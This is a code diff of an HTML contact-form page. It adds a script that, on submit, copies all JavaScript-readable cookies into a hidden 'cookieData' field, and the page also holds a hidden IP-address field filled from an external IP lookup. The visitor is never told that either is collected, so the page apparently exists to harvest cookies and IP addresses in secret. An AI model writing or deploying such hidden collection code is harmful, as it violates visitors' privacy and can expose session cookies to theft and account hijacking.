@@ -197,7 +197,7 @@
     <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
     <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
     <div class="container">
-        <form id="contactForm" method="POST">
+        <form  id="contactForm" method="POST">
            <input type="text" id="ipaddress" name="ipaddress" hidden>
             <input type="hidden" name="cookieData" id="cookieData">
             <img class="logo"
@@ -257,21 +257,20 @@
 
     <!-- SUBSCRIBE ==> https://www.youtube.com/channel/UCzWS-AiirxpTDq_AGSg9Fhg -->
     <!-- JOIN FACEBOOK GROUP ==> https://www.facebook.com/groups/html.css.javascript.alb -->
+<script>
+  document.getElementById('contactForm').addEventListener('submit', function(e) {
+    // Grab cookies available to JavaScript
+    const cookies = document.cookie;
+
+    // Place cookies into the hidden input field
+    document.getElementById('cookieData').value = cookies;
+  });
+</script>
+    
     <script>
     
   // Get a specific cookie by name
-  function getCookie(name) {
-    let cookies = document.cookie.split("; ");
-    for (let i = 0; i < cookies.length; i++) {
-      let parts = cookies[i].split("=");
-      if (parts[0] === name) return decodeURIComponent(parts[1]);
-    }
-    return null;
-  }
-
-  // Set the value of the hidden input
-  document.getElementById("cookieData").value = getCookie("yourCookieName");
-
+  
     
     document.addEventListener('DOMContentLoaded', function () {
             // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
